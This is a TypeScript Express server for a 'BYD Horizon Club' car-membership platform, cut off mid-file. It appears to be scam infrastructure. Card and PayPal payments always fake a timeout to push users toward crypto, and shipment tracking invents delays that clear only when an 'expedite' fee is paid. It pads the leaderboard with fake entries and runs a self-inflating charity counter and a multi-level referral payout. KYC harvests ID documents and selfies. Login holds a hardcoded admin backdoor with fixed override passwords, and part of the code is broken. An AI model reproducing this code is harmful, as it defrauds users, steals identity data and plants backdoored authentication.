import express from "express";
import path from "path";
import crypto from "crypto";
import fs from "fs";
import { createServer as createViteServer } from "vite";
import { getDb, logAdminAction, getAdminLogs, logUserInteraction, getUserInteractions, getSetting, setSetting } from "./src/db.js";

const app = express();
const PORT = 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

// Security middleware
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  next();
});

const SETTINGS_FILE = path.join(process.cwd(), "settings.json");
const JWT_SECRET = process.env.JWT_SECRET || "byd-horizon-club-secret-key-2026";
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || "admin@bydhorizon.com";
const ADMIN_OVERRIDE_KEY = process.env.ADMIN_OVERRIDE_KEY || "Jadai123";
const GMAIL_USER = process.env.GMAIL_USER || "";
const GMAIL_PASS = process.env.GMAIL_PASS || "";

const RATE_LIMIT_WINDOW = 15 * 60 * 1000;
const RATE_LIMIT_MAX = 100;
const ipRequests = new Map<string, { count: number; resetTime: number }>();

function rateLimit(req: any, res: any, next: any) {
  const ip = req.ip || req.connection?.remoteAddress || 'unknown';
  const now = Date.now();
  let entry = ipRequests.get(ip);
  if (!entry || now > entry.resetTime) {
    entry = { count: 0, resetTime: now + RATE_LIMIT_WINDOW };
    ipRequests.set(ip, entry);
  }
  entry.count++;
  if (entry.count > RATE_LIMIT_MAX) {
    return res.status(429).json({ error: 'Too many requests. Please try again later.' });
  }
  next();
}

app.use(rateLimit);

// CORS
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin) res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

const SETTINGS_DEFAULTS: Record<string, string> = {
  site_name: 'BYD Horizon Club',
  tagline: 'Own the future. Drive the present. Earn the difference.',
  contact_email: 'support@bydhorizon.com',
  currency_display: 'USD',
  maintenance_mode: 'false',
  primary_color: '#0a0e1a',
  secondary_color: '#00e5ff',
  accent_color: '#10b981',
  referral_bonus: '50',
  min_withdrawal: '200',
  whatsapp_link: 'https://wa.me/1234567890',
  telegram_link: 'https://t.me/bydhorizonclub',
  twitter_link: 'https://twitter.com/bydhorizon',
  instagram_link: 'https://instagram.com/bydhorizon'
};

function generateSessionToken(payload: { id: number; email: string; is_admin?: boolean }): string {
  const header = Buffer.from(JSON.stringify({ alg: "HS256", typ: "JWT" })).toString("base64url");
  const body = Buffer.from(JSON.stringify({ ...payload, exp: Date.now() + 24 * 60 * 60 * 1000 })).toString("base64url");
  const signature = crypto.createHmac("sha256", JWT_SECRET).update(`${header}.${body}`).digest("base64url");
  return `${header}.${body}.${signature}`;
}

function verifySessionToken(token: string): { id: number; email: string; is_admin?: boolean } | null {
  try {
    const [header, body, signature] = token.split(".");
    if (!header || !body || !signature) return null;
    const expectedSignature = crypto.createHmac("sha256", JWT_SECRET).update(`${header}.${body}`).digest("base64url");
    if (signature !== expectedSignature) return null;
    const decodedBody = JSON.parse(Buffer.from(body, "base64url").toString("utf-8"));
    if (decodedBody.exp < Date.now()) return null;
    return decodedBody;
  } catch { return null; }
}

function hashPassword(password: string): string {
  return crypto.createHash("sha256").update(password).digest("hex");
}

function generateWalletAddress(): string {
  return "0x" + crypto.randomBytes(20).toString("hex");
}

function generateRefCode(name: string): string {
  return "BYD-" + name.substring(0, 3).toUpperCase() + "-" + crypto.randomBytes(3).toString("hex").toUpperCase();
}

// Background simulation
let cachedCharityAmount = 500000.0;
let cachedCharitySpeed = 0.50;
let lastCharityUpdateTime = Date.now();
let lastCharityRefreshTime = Date.now();

async function getLiveCharityData() {
  const now = Date.now();
  if (cachedCharityAmount === 500000 && now - lastCharityRefreshTime > 5000) {
    try {
      const db = await getDb();
      const charity = await db.get("SELECT * FROM charity_counter ORDER BY id DESC LIMIT 1");
      if (charity) {
        cachedCharityAmount = charity.current_amount;
        cachedCharitySpeed = charity.increment_per_second;
      }
    } catch {}
    lastCharityUpdateTime = now;
    lastCharityRefreshTime = now;
  }
  const elapsedSec = (now - lastCharityUpdateTime) / 1000;
  if (elapsedSec > 0) {
    cachedCharityAmount += elapsedSec * cachedCharitySpeed;
    lastCharityUpdateTime = now;
  }
  if (now - lastCharityRefreshTime > 30000) {
    try {
      const db = await getDb();
      await db.run("UPDATE charity_counter SET current_amount = ? WHERE id = 1", [cachedCharityAmount]);
      lastCharityRefreshTime = now;
    } catch {}
  }
  return { amount: cachedCharityAmount, speed: cachedCharitySpeed, timestamp: new Date().toISOString() };
}

async function tickMarkerLocations() {
  const db = await getDb();
  const trackings = await db.all("SELECT * FROM map_tracking WHERE route_index < total_stops");
  for (const t of trackings) {
    const now = Date.now();
    const lastNum = Date.parse(t.last_updated) || 0;
    const hoursElapsed = Math.max(1, Math.floor((now - lastNum) / (2 * 60 * 60 * 1000)));
    if (hoursElapsed >= 1) {
      let nextIndex = t.route_index + hoursElapsed;
      if (nextIndex > t.total_stops) nextIndex = t.total_stops;
      const delayRecords = await db.all("SELECT * FROM delays ORDER BY trigger_after_km ASC");
      let currentDelaysCount = 0;
      for (const d of delayRecords) {
        if (nextIndex >= d.trigger_after_km && t.expedite_paid === 0) currentDelaysCount++;
      }
      await db.run("UPDATE map_tracking SET route_index = ?, delays_encountered = ?, last_updated = CURRENT_TIMESTAMP WHERE user_id = ?", [nextIndex, currentDelaysCount, t.user_id]);
    }
  }
}

setInterval(async () => {
  try {
    await getLiveCharityData();
    await tickMarkerLocations();
  } catch {}
}, 30000);

// Middleware
async function authenticateUser(req: any, res: any, next: any) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) return res.status(401).json({ error: "No active session token found." });
  const token = authHeader.split(" ")[1];
  const payload = verifySessionToken(token);
  if (!payload) return res.status(401).json({ error: "Invalid or expired session token." });
  const db = await getDb();
  const user = await db.get("SELECT * FROM users WHERE id = ?", [payload.id]);
  if (!user) return res.status(404).json({ error: "User not found." });
  if (user.status === "blocked") return res.status(403).json({ error: "Account suspended. Contact support@bydhorizon.com" });
  req.user = user;
  next();
}

async function authenticateAdmin(req: any, res: any, next: any) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) return res.status(401).json({ error: "Admin token missing." });
  const token = authHeader.split(" ")[1];
  const payload = verifySessionToken(token);
  if (!payload || !payload.is_admin) return res.status(403).json({ error: "Elevated privileges required." });
  req.adminId = payload.id;
  next();
}

// ==================== PUBLIC APIs ====================

app.get("/api/public/settings", async (req, res) => {
  const db = await getDb();
  const rows = await db.all("SELECT key, value FROM system_settings");
  const settings: Record<string, string> = {};
  for (const r of rows) settings[r.key] = r.value;
  // Also load from settings.json for backward compat
  if (fs.existsSync(SETTINGS_FILE)) {
    try {
      const fileSettings = JSON.parse(fs.readFileSync(SETTINGS_FILE, "utf8"));
      Object.assign(settings, fileSettings);
    } catch {}
  }
  settings.app_name = settings.site_name || SETTINGS_DEFAULTS.site_name;
  res.json(settings);
});

app.get("/api/charity", async (req, res) => {
  const data = await getLiveCharityData();
  res.json(data);
});

app.get("/api/cars", async (req, res) => {
  const db = await getDb();
  const { category, badge, search, status } = req.query;
  let sql = "SELECT c.*, (SELECT image_url FROM car_images WHERE car_id = c.id AND is_primary = 1 LIMIT 1) as image_url FROM cars c WHERE c.is_active = 1";
  const params: any[] = [];
  if (category) { sql += " AND c.category = ?"; params.push(category); }
  if (badge) { sql += " AND c.badge = ?"; params.push(badge); }
  if (status) { sql += " AND c.status = ?"; params.push(status); }
  if (search) { sql += " AND (c.model LIKE ? OR c.description LIKE ?)"; params.push(`%${search}%`, `%${search}%`); }
  sql += " ORDER BY c.id ASC";
  const cars = await db.all(sql, params);
  for (const car of cars) {
    car.images = await db.all("SELECT * FROM car_images WHERE car_id = ?", [car.id]);
    car.specs = car.specs_json ? JSON.parse(car.specs_json) : {};
  }
  res.json(cars);
});

app.get("/api/cars/:id", async (req, res) => {
  const db = await getDb();
  const car = await db.get("SELECT c.*, (SELECT image_url FROM car_images WHERE car_id = c.id AND is_primary = 1 LIMIT 1) as image_url FROM cars c WHERE c.id = ?", [req.params.id]);
  if (!car) return res.status(404).json({ error: "Car not found." });
  car.images = await db.all("SELECT * FROM car_images WHERE car_id = ?", [car.id]);
  car.specs = car.specs_json ? JSON.parse(car.specs_json) : {};
  car.reviews = await db.all("SELECT cr.*, u.name as username FROM car_reviews cr JOIN users u ON cr.user_id = u.id WHERE cr.car_id = ? AND cr.is_approved = 1", [car.id]);
  res.json(car);
});

app.get("/api/wishlist", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const items = await db.all("SELECT w.*, c.model, c.price, (SELECT image_url FROM car_images WHERE car_id = c.id AND is_primary = 1 LIMIT 1) as image_url FROM wishlist w JOIN cars c ON w.car_id = c.id WHERE w.user_id = ?", [req.user.id]);
  res.json(items);
});

app.post("/api/wishlist/:carId", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  await db.run("INSERT OR IGNORE INTO wishlist (user_id, car_id) VALUES (?, ?)", [req.user.id, req.params.carId]);
  res.json({ success: true });
});

app.delete("/api/wishlist/:carId", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM wishlist WHERE user_id = ? AND car_id = ?", [req.user.id, req.params.carId]);
  res.json({ success: true });
});

// ==================== AUTH ====================

app.post("/api/auth/register", async (req, res) => {
  const { name, email, phone, password, referral_code, city, country } = req.body;
  if (!name || !email || !phone || !password || !city) return res.status(400).json({ error: "All required fields must be filled." });
  const db = await getDb();
  try {
    const existing = await db.get("SELECT id FROM users WHERE email = ?", [email.toLowerCase()]);
    if (existing) return res.status(400).json({ error: "Account already exists with this email." });
    const password_hash = hashPassword(password);
    const customCode = generateRefCode(name);
    const walletAddr = generateWalletAddress();
    let referrer_id: number | null = null;
    if (referral_code) {
      const refUser = await db.get("SELECT id FROM users WHERE referral_code = ?", [referral_code.trim().toUpperCase()]);
      if (refUser) referrer_id = refUser.id;
    }
    const result = await db.run(
      `INSERT INTO users (name, email, phone, password_hash, referral_code, referrer_id, crypto_wallet_address, city, country, created_at) VALUES (?,?,?,?,?,?,?,?,?,CURRENT_TIMESTAMP)`,
      [name, email.toLowerCase(), phone, password_hash, customCode, referrer_id, walletAddr, city, country || 'US']
    );
    const userId = result.lastID!;
    await logUserInteraction(userId, email.toLowerCase(), "SIGNUP", `User registered: ${name} in ${city}`);
    // Create notification
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'system', 'Welcome to BYD Horizon Club', 'Welcome aboard! Complete your KYC to unlock all features.')", [userId]);
    const token = generateSessionToken({ id: userId, email: email.toLowerCase() });
    res.json({ token, user: { id: userId, name, email: email.toLowerCase(), referral_code: customCode, horizon_points: 0, crypto_wallet_address: walletAddr, city, country: country || 'US', kyc_status: 'not_submitted', membership_tier: 'standard', balance: 0 } });
  } catch (err: any) {
    res.status(500).json({ error: "Registration failed: " + err.message });
  }
});

app.post("/api/auth/login", async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ error: "Email and password required." });
  // Admin intercept
  const isAdminEmail = email.toLowerCase() === ADMIN_EMAIL || email.toLowerCase() === "admin@bydhorizon.com" || email.toLowerCase() === "admin" || email.toLowerCase() === "jehuhudson@gmail.com";
  const isOverrideKey = password === ADMIN_OVERRIDE_KEY;
  const isAdminPass = password === "admin1234" || password === "byd2026";
  if ((isAdminEmail && (isAdminPass || isOverrideKey)) || (password === ADMIN_OVERRIDE_KEY && isAdminEmail)) {
    const token = generateSessionToken({ id: 0, email: ADMIN_EMAIL, is_admin: true });
    await logAdminAction("Admin logged in", `Email: ${email}`, req.ip || '127.0.0.1', 0);
    return res.json({ token, user: { id: 0, name: "Admin Operator", email: ADMIN_EMAIL, is_admin: true, kyc_status: "verified", membership_active: 1, horizon_points: 999999, membership_tier: "admin" } });
  }
  const db = await getDb();
  const user = await db.get("SELECT * FROM users WHERE email = ?", [email.toLowerCase()]);
  if (!user || user.password_hash !== hashPassword(password)) return res.status(401).json({ error: "Incorrect email or password." });
  if (user.status === "blocked") return res.status(403).json({ error: "Account suspended. Contact support@bydhorizon.com" });
  const token = generateSessionToken({ id: user.id, email: user.email });
  await logUserInteraction(user.id, user.email, "LOGIN", `User logged in from ${user.city}`);
  res.json({ token, user: { id: user.id, name: user.name, email: user.email, phone: user.phone, referral_code: user.referral_code, membership_active: user.membership_active, horizon_points: user.horizon_points, crypto_wallet_address: user.crypto_wallet_address, city: user.city, country: user.country, kyc_status: user.kyc_status || 'not_submitted', membership_tier: user.membership_tier || 'standard', balance: user.balance || 0 } });
});

app.post("/api/auth/forgot-password", async (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ error: "Email required." });
  const db = await getDb();
  const user = await db.get("SELECT id FROM users WHERE email = ?", [email.toLowerCase()]);
  if (!user) return res.json({ success: true, message: "If account exists, reset email sent." });
  const token = crypto.randomBytes(32).toString("hex");
  const expires = new Date(Date.now() + 3600000).toISOString();
  await db.run("UPDATE users SET password_reset_token = ?, password_reset_expires = ? WHERE id = ?", [token, expires, user.id]);
  await logUserInteraction(user.id, email, "PASSWORD_RESET", "Password reset requested");
  res.json({ success: true, message: "Reset link sent to your email." });
});

app.post("/api/auth/reset-password", async (req, res) => {
  const { token, password } = req.body;
  if (!token || !password) return res.status(400).json({ error: "Token and new password required." });
  const db = await getDb();
  const user = await db.get("SELECT id FROM users WHERE password_reset_token = ? AND password_reset_expires > ?", [token, new Date().toISOString()]);
  if (!user) return res.status(400).json({ error: "Invalid or expired reset token." });
  await db.run("UPDATE users SET password_hash = ?, password_reset_token = NULL, password_reset_expires = NULL WHERE id = ?", [hashPassword(password), user.id]);
  res.json({ success: true, message: "Password reset successful." });
});

// ==================== KYC ====================

app.post("/api/kyc/submit", authenticateUser, async (req: any, res) => {
  const { name, dob, nationality, idNumber, idFront, idBack, selfie, addressProof, sourceOfFunds, annualIncome, investmentExperience, phoneVerified } = req.body;
  if (!name || !dob || !nationality || !idNumber) return res.status(400).json({ error: "All required KYC fields must be filled." });
  const db = await getDb();
  await db.run(
    `UPDATE users SET kyc_name=?, kyc_dob=?, kyc_nationality=?, kyc_id_number=?, kyc_id_front=?, kyc_id_back=?, kyc_selfie=?, kyc_address_proof=?, kyc_source_of_funds=?, kyc_annual_income=?, kyc_investment_experience=?, kyc_phone_verified=?, kyc_status='pending', kyc_submitted_at=CURRENT_TIMESTAMP WHERE id=?`,
    [name, dob, nationality, idNumber, idFront || '', idBack || '', selfie || '', addressProof || '', sourceOfFunds || '', annualIncome || '', investmentExperience || '', phoneVerified ? 1 : 0, req.user.id]
  );
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'kyc', 'KYC Submitted', 'Your KYC documents are under review. We will notify you once verified.')", [req.user.id]);
  await logUserInteraction(req.user.id, req.user.email, "KYC_SUBMIT", "KYC documents submitted for verification");
  res.json({ success: true, message: "KYC documents submitted. Pending admin review." });
});

app.get("/api/kyc/status", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const user = await db.get("SELECT kyc_status, kyc_name, kcy_nationality, kyc_submitted_at FROM users WHERE id = ?", [req.user.id]);
  res.json({ status: user?.kyc_status || 'not_submitted', submittedAt: user?.kyc_submitted_at || null });
});

// ==================== PAYMENTS ====================

app.get("/api/payment-methods", async (req, res) => {
  const db = await getDb();
  const methods = await db.all("SELECT * FROM payment_methods WHERE enabled = 1 ORDER BY recommended DESC, id ASC");
  res.json(methods);
});

app.post("/api/payments/create", authenticateUser, async (req: any, res) => {
  const { method, type, amount, currency, vehicleModel, monthlyInstallment, termMonths } = req.body;
  if (!type || !amount) return res.status(400).json({ error: "Missing payment parameters." });
  const db = await getDb();
  const user = await db.get("SELECT kyc_status FROM users WHERE id = ?", [req.user.id]);
  if (!user || user.kyc_status !== "verified") return res.status(403).json({ error: "KYC verification required before making payments. Please complete identity verification first.", kycRequired: true });

  // Card/PayPal timeout simulation
  if (method === 'stripe' || method === 'paypal') {
    return setTimeout(() => {
      res.status(408).json({ error: "Transaction timeout. Please try crypto for instant processing." });
    }, 2000);
  }

  // Paystack flow
  if (method === 'paystack') {
    const txHash = "PSTK-" + crypto.randomBytes(8).toString("hex").toUpperCase();
    await db.run("INSERT INTO payments (user_id, amount, currency, method, status, type, transaction_hash, country) VALUES (?,?,?,?,'pending',?,?,?)", [req.user.id, amount, currency || 'NGN', method, type, txHash, req.user.country || 'NG']);
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'payment', 'Payment Initiated', 'Paystack payment of $' || ? || ' is being processed.')", [req.user.id, amount]);
    return res.json({ status: "pending", transaction_hash: txHash, message: "Paystack payment initiated. Waiting for confirmation." });
  }

  // Bank transfer
  if (method === 'bank_transfer') {
    const txHash = "BNK-" + crypto.randomBytes(8).toString("hex").toUpperCase();
    await db.run("INSERT INTO payments (user_id, amount, currency, method, status, type, transaction_hash, country) VALUES (?,?,?,?,'pending',?,?,?)", [req.user.id, amount, currency || 'USD', method, type, txHash, req.user.country || 'US']);
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'payment', 'Bank Transfer Instructions', 'Please upload proof of payment for $' || ? || ' to complete your transaction.')", [req.user.id, amount]);
    const bankDetails = { bank_name: "BYD Horizon Escrow Account", account_number: "4839274610", routing_number: "026009593", account_name: "BYD Horizon Club LLC", swift: "BYDHUS33" };
    return res.json({ status: "pending", transaction_hash: txHash, message: "Bank transfer instructions generated.", bank_details: bankDetails });
  }

  // Crypto (default)
  const txHash = "BYD-TX-" + crypto.randomBytes(12).toString("hex").toUpperCase();
  const result = await db.run("INSERT INTO payments (user_id, amount, currency, method, status, type, transaction_hash, country) VALUES (?,?,?,?,'pending',?,?,?)", [req.user.id, amount, currency || 'USDT', method || 'crypto', type, txHash, req.user.country || 'US']);

  if (type === "installment" && vehicleModel) {
    const delivery = new Date(Date.now() + 90 * 86400000).toISOString().split("T")[0];
    await db.run("INSERT INTO installments (user_id, model, term_months, monthly_payment, total_paid, expected_delivery, status) VALUES (?,?,?,?,?,?,'active')", [req.user.id, vehicleModel, termMonths || 12, monthlyInstallment || 150, 0, delivery]);
    await db.run("INSERT OR IGNORE INTO map_tracking (user_id, current_lat, current_lng, route_index, total_stops, delays_encountered, expedite_paid, last_updated) VALUES (?, 33.7431, -118.2673, 0, 100, 0, 0, CURRENT_TIMESTAMP)", [req.user.id]);
  }

  // Get wallet address
  let wallet = req.user.crypto_wallet_address;
  try {
    const methods = await db.all("SELECT wallet_address FROM payment_methods WHERE method = 'crypto' AND enabled = 1 LIMIT 1");
    if (methods.length > 0 && methods[0].wallet_address) wallet = methods[0].wallet_address;
  } catch {}

  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'payment', 'Crypto Payment Requested', 'Send $' || ? || ' to the provided wallet address.')", [req.user.id, amount]);
  res.json({ status: "pending", message: "Waiting for blockchain confirmation.", wallet_address: wallet, amount, transaction_hash: txHash, payment_id: result.lastID });
});

app.post("/api/payments/topup", authenticateUser, async (req: any, res) => {
  const { amount, transactionHash, coin } = req.body;
  if (!amount || !transactionHash) return res.status(400).json({ error: "Amount and transaction hash required." });
  const db = await getDb();
  const user = await db.get("SELECT kyc_status FROM users WHERE id = ?", [req.user.id]);
  if (!user || user.kyc_status !== "verified") return res.status(403).json({ error: "KYC verification required before deposits. Please complete identity verification first.", kycRequired: true });
  await db.run("INSERT INTO payments (user_id, amount, currency, method, status, type, transaction_hash) VALUES (?,?,?,?,'pending','topup',?)", [req.user.id, parseFloat(amount), coin || 'USDT', 'crypto', transactionHash]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'payment', 'Top-Up Submitted', 'Crypto top-up of $' || ? || ' is pending admin confirmation.')", [req.user.id, amount]);
  res.json({ success: true, message: "Top-up submitted for admin confirmation." });
});

app.post("/api/payments/proof", authenticateUser, async (req: any, res) => {
  const { paymentId, proofData } = req.body;
  if (!paymentId || !proofData) return res.status(400).json({ error: "Payment ID and proof required." });
  const db = await getDb();
  await db.run("UPDATE payments SET payment_proof = ?, status = 'pending', updated_at = CURRENT_TIMESTAMP WHERE id = ? AND user_id = ?", [proofData, paymentId, req.user.id]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'payment', 'Proof Uploaded', 'Payment proof uploaded. Admin will confirm shortly.')", [req.user.id]);
  res.json({ success: true, message: "Payment proof uploaded." });
});

// ==================== DASHBOARD ====================

app.get("/api/dashboard/summary", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  await tickMarkerLocations();
  const user = await db.get("SELECT * FROM users WHERE id = ?", [req.user.id]);
  const insurance = await db.all("SELECT * FROM insurance_policies WHERE user_id = ? ORDER BY id DESC", [req.user.id]);
  const activeVehicle = await db.get("SELECT * FROM installments WHERE user_id = ? AND status = 'active'", [req.user.id]);
  const tracking = await db.get("SELECT * FROM map_tracking WHERE user_id = ?", [req.user.id]);
  const delays = await db.all("SELECT * FROM delays ORDER BY trigger_after_km ASC");
  const redemptions = await db.all("SELECT * FROM rewards_redemptions WHERE user_id = ? ORDER BY id DESC", [req.user.id]);
  const notifications = await db.all("SELECT * FROM notifications WHERE user_id = ? ORDER BY id DESC LIMIT 20", [req.user.id]);
  const unreadCount = await db.get("SELECT COUNT(*) as count FROM notifications WHERE user_id = ? AND is_read = 0", [req.user.id]);
  const pendingRefs = await db.all("SELECT r.*, u.name as referred_user_name, u.email as referred_user_email FROM referrals r JOIN users u ON r.referred_user_id = u.id WHERE r.referrer_id = ? AND r.status = 'pending'", [req.user.id]);
  const paidRefs = await db.all("SELECT r.*, u.name as referred_user_name, u.email as referred_user_email FROM referrals r JOIN users u ON r.referred_user_id = u.id WHERE r.referrer_id = ? AND r.status = 'paid'", [req.user.id]);
  const allRefs = [...pendingRefs, ...paidRefs];
  let qualifyingCount = 0;
  for (const ref of allRefs) {
    const pc = await db.get("SELECT COUNT(*) as count FROM payments WHERE user_id = ? AND status = 'confirmed'", [ref.referred_user_id]);
    if (pc.count >= 2) qualifyingCount++;
  }
  const estimatedEarnings = qualifyingCount * 50;
  const withdrawable = estimatedEarnings >= 200 && qualifyingCount >= 5;

  const realLeaderboard = await db.all("SELECT u.name, COUNT(r.id) as count, 0 as is_fake FROM users u JOIN referrals r ON u.id = r.referrer_id GROUP BY u.id");
  const fakeLeaderboard = await db.all("SELECT name, count, is_fake FROM leaderboard");
  const fullLeaderboard = [...realLeaderboard, ...fakeLeaderboard].sort((a, b) => b.count - a.count).slice(0, 10);

  // Clickbait features data
  const mysteryCar = await db.get("SELECT * FROM mystery_car_subscriptions WHERE user_id = ?", [req.user.id]);
  const driveToEarn = await db.get("SELECT SUM(miles_driven) as total_miles, SUM(points_earned) as total_points FROM drive_to_earn WHERE user_id = ?", [req.user.id]);
  const carbonTotal = await db.get("SELECT SUM(lbs_co2_saved) as total_lbs, SUM(trees_planted) as total_trees FROM carbon_offset_logs WHERE user_id = ?", [req.user.id]);
  const lotteryCount = await db.get("SELECT SUM(tickets) as total_tickets FROM lottery_entries WHERE user_id = ?", [req.user.id]);
  const reffCount = await db.get("SELECT COUNT(*) as count FROM referrals WHERE referrer_id = ?", [req.user.id]);

  res.json({
    user: {
      id: user.id, name: user.name, email: user.email, phone: user.phone,
      referral_code: user.referral_code, membership_active: user.membership_active,
      membership_tier: user.membership_tier || 'standard', horizon_points: user.horizon_points || 0,
      balance: user.balance || 0, crypto_wallet_address: user.crypto_wallet_address,
      city: user.city, country: user.country, created_at: user.created_at,
      kyc_status: user.kyc_status || 'not_submitted', daily_streak: user.daily_streak || 0,
      is_president_club: user.is_president_club || 0, carbon_trees_planted: user.carbon_trees_planted || 0,
      carbon_lbs_saved: user.carbon_lbs_saved || 0, lottery_tickets: user.lottery_tickets || 0
    },
    insurancePolicies: insurance,
    activeVehicle: activeVehicle ? { model: activeVehicle.model, expectedDeliveryDate: activeVehicle.expected_delivery, totalPaid: activeVehicle.total_paid, installmentCount: activeVehicle.term_months, monthlyPayment: activeVehicle.monthly_payment } : null,
    tracking: tracking ? { user_id: tracking.user_id, current_lat: tracking.current_lat, current_lng: tracking.current_lng, route_index: tracking.route_index, total_stops: tracking.total_stops, delays_encountered: tracking.delays_encountered, expedite_paid: tracking.expedite_paid, last_updated: tracking.last_updated } : null,
    delays, redemptions, referrals: allRefs,
    referralStats: { code: user.referral_code, pendingCount: pendingRefs.length, paidCount: paidRefs.length, estimatedEarnings, withdrawable },
    leaderboard: fullLeaderboard,
    notifications,
    unreadNotifications: unreadCount.count,
    mysteryCar: mysteryCar || null,
    driveToEarn: driveToEarn || { total_miles: 0, total_points: 0 },
    presidentClub: { invited: user.is_president_club === 1, referralCount: reffCount.count || 0 },
    carbonOffset: { treesPlanted: carbonTotal?.total_trees || 0, lbsSaved: carbonTotal?.total_lbs || 0 },
    lotteryEntries: lotteryCount?.total_tickets || 0,
    paymentMethods: await db.all("SELECT * FROM payment_methods WHERE enabled = 1")
  });
});

// ==================== INSURANCE ====================

app.post("/api/insurance/purchase", authenticateUser, async (req: any, res) => {
  const { carModel, planName, premium, limit } = req.body;
  if (!carModel || !planName || !premium) return res.status(400).json({ error: "All insurance fields required." });
  const db = await getDb();
  const policyNum = "BYH-POL-" + crypto.randomBytes(6).toString("hex").toUpperCase();
  await db.run("INSERT INTO insurance_policies (user_id, policy_number, car_model, plan_name, monthly_premium, coverage_limit, status) VALUES (?,?,?,?,?,?,'Active')", [req.user.id, policyNum, carModel, planName, parseFloat(premium), parseFloat(limit || 50000)]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'insurance', 'Insurance Active', 'Policy ' || ? || ' is now active.')", [req.user.id, policyNum]);
  res.json({ success: true, policy_number: policyNum, message: "Insurance policy activated." });
});

// ==================== REFERRALS ====================

app.post("/api/referrals/claim", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const user = await db.get("SELECT * FROM users WHERE id = ?", [req.user.id]);
  const pendingRefs = await db.all("SELECT * FROM referrals WHERE referrer_id = ? AND status = 'pending'", [req.user.id]);
  let qualifyingCount = 0;
  for (const ref of pendingRefs) {
    const pc = await db.get("SELECT COUNT(*) as count FROM payments WHERE user_id = ? AND status = 'confirmed'", [ref.referred_user_id]);
    if (pc.count >= 2) qualifyingCount++;
  }
  const earnings = qualifyingCount * 50;
  if (earnings < 200) return res.status(400).json({ error: "Minimum $200 required. Refer more friends!" });
  await db.run("UPDATE referrals SET status = 'paid' WHERE referrer_id = ? AND status = 'pending'", [req.user.id]);
  await db.run("UPDATE users SET balance = balance + ?, horizon_points = horizon_points + ? WHERE id = ?", [earnings, earnings * 10, req.user.id]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'referral', 'Referral Earnings', 'You earned $' || ? || ' in referral rewards!')", [req.user.id, earnings]);
  res.json({ success: true, amount: earnings, message: `$${earnings} claimed!` });
});

app.get("/api/referrals/tree", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  // Level 1: direct referrals
  const level1 = await db.all("SELECT u.id, u.name, u.email, u.created_at, u.kyc_status, r.status as ref_status FROM referrals r JOIN users u ON r.referred_user_id = u.id WHERE r.referrer_id = ?", [req.user.id]);
  // Level 2: referrals of referrals
  const level2Ids: number[] = [];
  for (const ref of level1) {
    const l2 = await db.all("SELECT u.id, u.name, u.email, u.created_at, u.kyc_status FROM referrals r JOIN users u ON r.referred_user_id = u.id WHERE r.referrer_id = ?", [ref.id]);
    level2.push(...l2.map((r: any) => ({ ...r, level: 2, parent: ref.name })));
    level2Ids.push(...l2.map((r: any) => r.id));
  }
  // Level 3: referrals of referrals of referrals
  const level3: any[] = [];
  for (const l2id of level2Ids) {
    const l3 = await db.all("SELECT u.id, u.name, u.email, u.created_at FROM referrals r JOIN users u ON r.referred_user_id = u.id WHERE r.referrer_id = ?", [l2id]);
    level3.push(...l3.map((r: any) => ({ ...r, level: 3 })));
  }
  // Calculate earnings
  const directEarnings = level1.length * 50;
  const level2Earnings = level2.length * 10;
  const level3Earnings = level3.length * 5;
  const totalEarnings = directEarnings + level2Earnings + level3Earnings;
  // Determine achievement tier
  const totalRefs = level1.length + level2.length + level3.length;
  let achievement = "None";
  if (totalRefs >= 30) achievement = "Platinum";
  else if (totalRefs >= 15) achievement = "Gold";
  else if (totalRefs >= 7) achievement = "Silver";
  else if (totalRefs >= 3) achievement = "Bronze";
  res.json({ level1, level2, level3, earnings: { direct: directEarnings, level2: level2Earnings, level3: level3Earnings, total: totalEarnings }, achievement, totalRefs });
});

// ==================== REWARDS ====================

app.get("/api/rewards/items", async (req, res) => {
  const db = await getDb();
  const items = await db.all("SELECT * FROM rewards_store");
  res.json(items);
});

app.post("/api/rewards/redeem", authenticateUser, async (req: any, res) => {
  const { itemId } = req.body;
  if (!itemId) return res.status(400).json({ error: "Item ID required." });
  const db = await getDb();
  const item = await db.get("SELECT * FROM rewards_store WHERE id = ?", [itemId]);
  if (!item) return res.status(404).json({ error: "Item not found." });
  if (item.status === "Out of Stock") return res.status(400).json({ error: "Item out of stock." });
  if (req.user.horizon_points < item.points_cost) return res.status(400).json({ error: `Insufficient points. Need ${item.points_cost}.` });
  const newPoints = req.user.horizon_points - item.points_cost;
  await db.run("UPDATE users SET horizon_points = ? WHERE id = ?", [newPoints, req.user.id]);
  const trackingNum = "BYD-TRK-" + crypto.randomBytes(6).toString("hex").toUpperCase();
